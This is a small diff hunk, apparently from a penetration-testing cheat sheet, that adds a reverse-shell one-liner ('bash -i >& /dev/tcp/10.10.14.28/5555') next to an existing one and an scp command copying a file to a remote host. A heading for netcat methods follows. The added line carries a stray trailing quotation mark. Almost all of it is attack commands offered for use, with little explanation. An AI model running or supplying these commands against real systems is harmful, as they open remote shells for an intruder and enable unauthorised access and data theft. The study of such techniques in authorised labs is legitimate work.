@@ -88,6 +88,10 @@ scp -r /home/kali/file.txt user@10.10.10.77:/home/user/
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
 
+```
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.28/5555 0>&1'"
+```
+
 * #### With netcat
 
 ```
